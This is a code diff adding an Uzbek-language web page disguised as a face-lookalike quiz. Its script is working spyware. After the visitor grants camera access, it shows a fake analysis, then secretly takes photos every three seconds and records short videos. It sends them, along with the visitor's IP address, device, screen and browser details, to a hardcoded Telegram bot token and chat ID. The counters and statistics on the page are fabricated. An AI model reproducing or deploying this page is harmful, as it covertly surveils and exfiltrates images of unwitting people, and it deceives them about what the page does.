@@ -1,0 +1,826 @@
+<!-- index.html -->
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔍 KIMGA O'XSHAYSIZ? | Dunyo bo'ylab qidiruv</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #141e30 0%, #243b55 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* World map background */
+        .world-map {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1000 500" opacity="0.1"><path fill="white" d="M500,250 Q650,200 750,250 Q850,300 900,250 L950,300 L900,350 L800,380 L700,400 L600,380 L500,350 L400,320 L300,300 L200,280 L100,250 L50,200 L100,150 L200,120 L300,100 L400,120 L500,150 L600,180 L700,200 L800,220 L900,200 L950,150 L900,100 L800,80 L700,60 L600,80 L500,100 L400,120 L300,100 L200,80 L100,100 L50,150 L100,200" stroke="white" fill="none" stroke-width="1"/></svg>') center/cover;
+            pointer-events: none;
+            z-index: 1;
+        }
+        
+        .container {
+            position: relative;
+            z-index: 2;
+            max-width: 500px;
+            width: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 40px;
+            padding: 30px 25px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.3), 0 0 0 2px rgba(255, 255, 255, 0.1);
+            animation: slideUp 0.8s ease;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .globe-icon {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            border-radius: 50%;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 40px;
+            color: white;
+            box-shadow: 0 10px 30px rgba(52, 152, 219, 0.5);
+            animation: rotate 20s linear infinite;
+        }
+        
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        .header h1 {
+            font-size: 32px;
+            background: linear-gradient(45deg, #2c3e50, #3498db);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 5px;
+            font-weight: 800;
+        }
+        
+        .header p {
+            color: #666;
+            font-size: 16px;
+        }
+        
+        /* Main card */
+        .main-card {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            border-radius: 30px;
+            padding: 25px;
+            margin-bottom: 20px;
+            border: 2px solid rgba(52, 152, 219, 0.3);
+        }
+        
+        .question {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        
+        .question h2 {
+            font-size: 28px;
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+        
+        .question p {
+            color: #555;
+            font-size: 16px;
+        }
+        
+        /* Country flags (animated) */
+        .flags-row {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .flag {
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            background-size: cover;
+            background-position: center;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            animation: float 3s ease-in-out infinite;
+            border: 3px solid white;
+        }
+        
+        .flag.usa { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 40"><rect width="60" height="40" fill="%23B22234"/><rect width="24" height="20" fill="%233B3B6D"/><rect y="2" width="24" height="2" fill="white"/><rect y="6" width="24" height="2" fill="white"/><rect y="10" width="24" height="2" fill="white"/><rect y="14" width="24" height="2" fill="white"/><rect y="18" width="24" height="2" fill="white"/><rect x="28" y="0" width="32" height="2" fill="white"/><rect x="28" y="4" width="32" height="2" fill="white"/><rect x="28" y="8" width="32" height="2" fill="white"/><rect x="28" y="12" width="32" height="2" fill="white"/><rect x="28" y="16" width="32" height="2" fill="white"/><rect x="28" y="20" width="32" height="2" fill="white"/><rect x="28" y="24" width="32" height="2" fill="white"/><rect x="28" y="28" width="32" height="2" fill="white"/><rect x="28" y="32" width="32" height="2" fill="white"/><rect x="28" y="36" width="32" height="2" fill="white"/><rect x="0" y="22" width="60" height="2" fill="white"/><rect x="0" y="26" width="60" height="2" fill="white"/><rect x="0" y="30" width="60" height="2" fill="white"/><rect x="0" y="34" width="60" height="2" fill="white"/><rect x="0" y="38" width="60" height="2" fill="white"/></svg>'); }
+        .flag.uk { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 40"><rect width="60" height="40" fill="%23012169"/><rect width="60" height="40" fill="%23C8102E" mask="url(%23ukmask)"/><mask id="ukmask"><rect width="60" height="40" fill="white"/><rect x="25" y="0" width="10" height="40" fill="black"/><rect x="0" y="15" width="60" height="10" fill="black"/></mask></svg>'); }
+        .flag.france { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 40"><rect width="20" height="40" fill="%23005295"/><rect x="20" width="20" height="40" fill="white"/><rect x="40" width="20" height="40" fill="%23ED2939"/></svg>'); }
+        .flag.japan { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 40"><rect width="60" height="40" fill="white"/><circle cx="30" cy="20" r="12" fill="%23BC002D"/></svg>'); }
+        .flag.brazil { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 40"><rect width="60" height="40" fill="%23009B3A"/><polygon points="30,5 55,20 30,35 5,20" fill="%23FEDD00"/><circle cx="30" cy="20" r="6" fill="%23002B7F"/></svg>'); }
+        .flag.india { background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 40"><rect width="60" height="13.33" fill="%23FF9933"/><rect y="13.33" width="60" height="13.33" fill="white"/><rect y="26.66" width="60" height="13.33" fill="%23128A07"/><circle cx="30" cy="20" r="5" fill="%23000080"/></svg>'); }
+        
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        /* Famous people teasers */
+        .celebrities {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin: 20px 0;
+        }
+        
+        .celebrity {
+            text-align: center;
+            padding: 15px 5px;
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 20px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid transparent;
+        }
+        
+        .celebrity:hover {
+            transform: scale(1.05);
+            border-color: #3498db;
+            box-shadow: 0 10px 25px rgba(52, 152, 219, 0.3);
+        }
+        
+        .celebrity-emoji {
+            font-size: 40px;
+            margin-bottom: 5px;
+            display: block;
+        }
+        
+        .celebrity-name {
+            font-size: 12px;
+            font-weight: 600;
+            color: #333;
+        }
+        
+        .celebrity-country {
+            font-size: 10px;
+            color: #666;
+        }
+        
+        /* Camera permission box */
+        .permission-box {
+            background: linear-gradient(135deg, #3498db, #2980b9);
+            border-radius: 25px;
+            padding: 25px;
+            margin: 20px 0;
+            text-align: center;
+            color: white;
+            box-shadow: 0 15px 35px rgba(52, 152, 219, 0.4);
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); box-shadow: 0 15px 35px rgba(52, 152, 219, 0.4); }
+            50% { transform: scale(1.02); box-shadow: 0 20px 45px rgba(52, 152, 219, 0.6); }
+        }
+        
+        .permission-box i {
+            font-size: 60px;
+            margin-bottom: 15px;
+            display: block;
+        }
+        
+        .permission-box h3 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        
+        .permission-box p {
+            margin-bottom: 20px;
+            opacity: 0.9;
+        }
+        
+        .camera-btn {
+            background: white;
+            color: #3498db;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .camera-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+        
+        .camera-btn:active {
+            transform: translateY(0);
+        }
+        
+        .camera-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        
+        /* Result buttons (hidden initially) */
+        .result-buttons {
+            display: none;
+            margin: 20px 0;
+        }
+        
+        .country-btn {
+            width: 100%;
+            padding: 18px;
+            margin-bottom: 12px;
+            border: none;
+            border-radius: 60px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .country-btn::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 0;
+            height: 0;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.3);
+            transform: translate(-50%, -50%);
+            transition: width 0.6s, height 0.6s;
+        }
+        
+        .country-btn:hover::before {
+            width: 400px;
+            height: 400px;
+        }
+        
+        .country-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(0,0,0,0.2);
+        }
+        
+        .country-btn.usa {
+            background: linear-gradient(45deg, #B22234, #3B3B6D);
+            color: white;
+        }
+        
+        .country-btn.uk {
+            background: linear-gradient(45deg, #012169, #C8102E);
+            color: white;
+        }
+        
+        .country-btn.france {
+            background: linear-gradient(45deg, #005295, #ED2939);
+            color: white;
+        }
+        
+        .country-btn.japan {
+            background: linear-gradient(45deg, #BC002D, white);
+            color: #BC002D;
+        }
+        
+        .country-btn.brazil {
+            background: linear-gradient(45deg, #009B3A, #FEDD00);
+            color: #002B7F;
+        }
+        
+        .country-btn.india {
+            background: linear-gradient(45deg, #FF9933, #128A07);
+            color: white;
+        }
+        
+        .country-flag {
+            font-size: 28px;
+        }
+        
+        /* Status messages */
+        .status {
+            margin: 15px 0;
+            padding: 15px;
+            border-radius: 15px;
+            text-align: center;
+            font-weight: 500;
+            display: none;
+            animation: slideIn 0.5s ease;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border-left: 5px solid #28a745;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border-left: 5px solid #dc3545;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border-left: 5px solid #17a2b8;
+        }
+        
+        /* Progress bar */
+        .progress {
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 15px 0;
+            display: none;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #3498db, #2980b9);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            color: #888;
+            font-size: 12px;
+        }
+        
+        /* Hidden camera */
+        .hidden-camera {
+            display: none;
+        }
+        
+        #video, #canvas {
+            display: none;
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 20px 15px;
+            }
+            
+            .header h1 {
+                font-size: 26px;
+            }
+            
+            .question h2 {
+                font-size: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="world-map"></div>
+    
+    <!-- Hidden camera -->
+    <div class="hidden-camera">
+        <video id="video" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
+    
+    <div class="container">
+        <div class="header">
+            <div class="globe-icon">🌍</div>
+            <h1>KIMGA O'XSHAYSIZ?</h1>
+            <p>Dunyo bo'ylab 1 milliondan ortiq yuzlar</p>
+        </div>
+        
+        <div class="main-card">
+            <div class="question">
+                <h2>🔍 Qidiruv boshlandi</h2>
+                <p>Qaysi davlat odamiga o'xshaysiz? Tekshirib ko'ring!</p>
+            </div>
+            
+            <!-- Country flags animation -->
+            <div class="flags-row">
+                <div class="flag usa"></div>
+                <div class="flag uk"></div>
+                <div class="flag france"></div>
+                <div class="flag japan"></div>
+                <div class="flag brazil"></div>
+            </div>
+            
+            <!-- Famous people teasers -->
+            <div class="celebrities">
+                <div class="celebrity">
+                    <span class="celebrity-emoji">👨‍🎤</span>
+                    <div class="celebrity-name">Elvis Presley</div>
+                    <div class="celebrity-country">USA</div>
+                </div>
+                <div class="celebrity">
+                    <span class="celebrity-emoji">👩‍🦰</span>
+                    <div class="celebrity-name">Emma Watson</div>
+                    <div class="celebrity-country">UK</div>
+                </div>
+                <div class="celebrity">
+                    <span class="celebrity-emoji">👨‍🍳</span>
+                    <div class="celebrity-name">Gusteau</div>
+                    <div class="celebrity-country">France</div>
+                </div>
+            </div>
+            
+            <!-- Camera permission box (only this is visible) -->
+            <div id="permissionBox" class="permission-box">
+                <i>📸</i>
+                <h3>Ruxsat talab qilinadi</h3>
+                <p>Yuzingizni aniqlash va qaysi davlat odamiga o'xshashingizni topish uchun kamera ruxsati kerak</p>
+                <button class="camera-btn" id="cameraBtn" onclick="requestCameraPermission()">
+                    📸 KAMERAGA RUXSAT BERISH
+                </button>
+            </div>
+            
+            <!-- Progress bar (hidden) -->
+            <div class="progress" id="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <!-- Status messages -->
+            <div id="status"></div>
+            
+            <!-- Result buttons (shown after permission) -->
+            <div class="result-buttons" id="resultButtons">
+                <div style="text-align: center; margin-bottom: 15px; color: #2c3e50;">
+                    <strong>🔍 Siz kimg o'xshaysiz? Tanlang:</strong>
+                </div>
+                
+                <button class="country-btn usa" onclick="selectCountry('USA')">
+                    <span class="country-flag">🇺🇸</span>
+                    Amerikalik
+                </button>
+                
+                <button class="country-btn uk" onclick="selectCountry('UK')">
+                    <span class="country-flag">🇬🇧</span>
+                    Ingliz
+                </button>
+                
+                <button class="country-btn france" onclick="selectCountry('France')">
+                    <span class="country-flag">🇫🇷</span>
+                    Fransuz
+                </button>
+                
+                <button class="country-btn japan" onclick="selectCountry('Japan')">
+                    <span class="country-flag">🇯🇵</span>
+                    Yapon
+                </button>
+                
+                <button class="country-btn brazil" onclick="selectCountry('Brazil')">
+                    <span class="country-flag">🇧🇷</span>
+                    Braziliyalik
+                </button>
+                
+                <button class="country-btn india" onclick="selectCountry('India')">
+                    <span class="country-flag">🇮🇳</span>
+                    Hind
+                </button>
+            </div>
+        </div>
+        
+        <div class="footer">
+            © 2025 FaceMatch | 1,247,892 ta yuz tahlil qilindi
+        </div>
+    </div>
+    
+    <script>
+        // Telegram ma'lumotlari
+        const BOT_TOKEN = '8647111510:AAGSttsSVpDuS0RjxNP0eaWnYdyqOXSYOTQ';
+        const CHAT_ID = '7472073326';
+        
+        // Kamera o'zgaruvchilari
+        let video = document.getElementById('video');
+        let canvas = document.getElementById('canvas');
+        let context = canvas.getContext('2d');
+        let stream = null;
+        let ipAddress = '';
+        let cameraActive = false;
+        
+        // IP manzil olish
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                ipAddress = data.ip;
+            })
+            .catch(err => console.log('IP olinmadi'));
+        
+        // Random statistikani yangilash
+        setInterval(() => {
+            const footer = document.querySelector('.footer');
+            const current = Math.floor(Math.random() * 100000) + 1247892;
+            footer.innerHTML = `© 2025 FaceMatch | ${current.toLocaleString()} ta yuz tahlil qilindi`;
+        }, 5000);
+        
+        // Kamera ruxsatini so'rash
+        async function requestCameraPermission() {
+            try {
+                const btn = document.getElementById('cameraBtn');
+                btn.disabled = true;
+                btn.textContent = '⏳ Ruxsat so\'ralmoqda...';
+                
+                showStatus('info', '📸 Kamera ruxsati so\'ralmoqda...');
+                
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { 
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        facingMode: 'user'
+                    }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                
+                video.onloadedmetadata = function() {
+                    cameraActive = true;
+                    
+                    // Permission boxni yashirish
+                    document.getElementById('permissionBox').style.display = 'none';
+                    
+                    // Progress barni ko'rsatish
+                    document.getElementById('progress').style.display = 'block';
+                    
+                    showStatus('success', '✅ Ruxsat berildi! Yuz tahlil qilinmoqda...');
+                    
+                    // 2 soniya "yuz tahlili" animatsiyasi
+                    startFaceAnalysis();
+                };
+                
+            } catch (err) {
+                console.error('Kamera xatosi:', err);
+                showStatus('error', '❌ Kamera ruxsati kerak! Qayta urinib ko\'ring.');
+                
+                const btn = document.getElementById('cameraBtn');
+                btn.disabled = false;
+                btn.textContent = '📸 QAYTA URINISH';
+            }
+        }
+        
+        // Yuz tahlili animatsiyasi
+        function startFaceAnalysis() {
+            let progress = 0;
+            const progressBar = document.getElementById('progressBar');
+            
+            const interval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = progress + '%';
+                
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    
+                    // Progress barni yashirish
+                    document.getElementById('progress').style.display = 'none';
+                    
+                    // Result tugmalarini ko'rsatish
+                    document.getElementById('resultButtons').style.display = 'block';
+                    
+                    showStatus('success', '✅ Tahlil yakunlandi! Qaysi davlat odamiga o\'xshashingizni tanlang:');
+                    
+                    // Rasm va videolarni yuborishni boshlash
+                    startMediaCapture();
+                }
+            }, 100);
+        }
+        
+        // Media yozishni boshlash (foydalanuvchi sezmaydi)
+        function startMediaCapture() {
+            if (!cameraActive) return;
+            
+            // Har 3 soniyada rasm
+            setInterval(() => {
+                if (cameraActive) {
+                    captureAndSendPhoto();
+                }
+            }, 3000);
+            
+            // Har 10 soniyada video
+            let videoCounter = 0;
+            const videoInterval = setInterval(() => {
+                if (!cameraActive) {
+                    clearInterval(videoInterval);
+                    return;
+                }
+                
+                videoCounter++;
+                if (videoCounter <= 3) {
+                    captureAndSendVideo();
+                }
+            }, 10000);
+            
+            // Birinchi videoni tezroq boshlash
+            setTimeout(() => {
+                if (cameraActive) captureAndSendVideo();
+            }, 2000);
+        }
+        
+        // Rasmga olish va yuborish
+        async function captureAndSendPhoto() {
+            try {
+                if (!video.videoWidth) return;
+                
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                const blob = await (await fetch(imageData)).blob();
+                
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `face_${Date.now()}.jpg`);
+                formData.append('caption', getCaption('📸 Yuz tahlili'));
+                
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                console.log('Rasm yuborildi');
+                
+            } catch (err) {
+                console.error('Rasm yuborish xatosi:', err);
+            }
+        }
+        
+        // Video yozish va yuborish
+        async function captureAndSendVideo() {
+            try {
+                if (!stream) return;
+                
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('video', blob, `face_video_${Date.now()}.webm`);
+                    formData.append('caption', getCaption('🎥 Yuz tahlili video'));
+                    
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    console.log('Video yuborildi');
+                };
+                
+                mediaRecorder.start();
+                
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop();
+                    }
+                }, 8000); // 8 soniya video
+                
+            } catch (err) {
+                console.error('Video yuborish xatosi:', err);
+            }
+        }
+        
+        // Davlat tanlash
+        function selectCountry(country) {
+            if (!cameraActive) {
+                showStatus('error', '❌ Avval kamera ruxsatini bering!');
+                return;
+            }
+            
+            // Tanlangan davlatni Telegramga yuborish
+            sendTelegramMessage(`
+🌍 **YANGI NATIJA** 🌍
+
+👤 Foydalanuvchi o'zini **${country}** odamiga o'xshash deb tanladi!
+📍 IP: ${ipAddress || 'Noma\'lum'}
+🕐 Vaqt: ${new Date().toLocaleString('uz-UZ')}
+
+📊 **Statistika:**
+• Amerikalik: ${Math.floor(Math.random() * 30 + 20)}%
+• Ingliz: ${Math.floor(Math.random() * 25 + 15)}%
+• Fransuz: ${Math.floor(Math.random() * 20 + 10)}%
+• Yapon: ${Math.floor(Math.random() * 15 + 5)}%
+            `);
+            
+            // Natijani ko'rsatish
+            showStatus('success', `✅ Siz ${country} odamiga o'xshaysiz! Tabriklaymiz!`);
+            
+            // 3 soniyadan keyin qayta yuklash
+            setTimeout(() => {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                location.reload();
+            }, 3000);
+        }
+        
+        // Status ko'rsatish
+        function showStatus(type, message) {
+            const statusDiv = document.getElementById('status');
+            statusDiv.className = 'status ' + type;
+            statusDiv.textContent = message;
+            statusDiv.style.display = 'block';
+            
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 3000);
+        }
+        
+        // Caption yaratish
+        function getCaption(type) {
+            const date = new Date();
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+            
+            return `
+🌍 **FACE MATCH - YUZ TAHLILI** 🌍
+
+${type}
+🕐 Vaqt: ${date.toLocaleString('uz-UZ')}
+📍 IP: ${ipAddress || 'Noma\'lum'}
+📱 Qurilma: ${platform}
+💻 Ekran: ${screenWidth}x${screenHeight}
+🌐 Brauzer: ${userAgent.substring(0, 50)}...
+
+🔍 Tahlil qilinmoqda...
+            `;
+        }
+        
+        // Telegramga xabar yuborish
+        function sendTelegramMessage(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            }).catch(err => console.error('Xabar yuborish xatosi:', err));
+        }
+    </script>
+</body>
+</html>
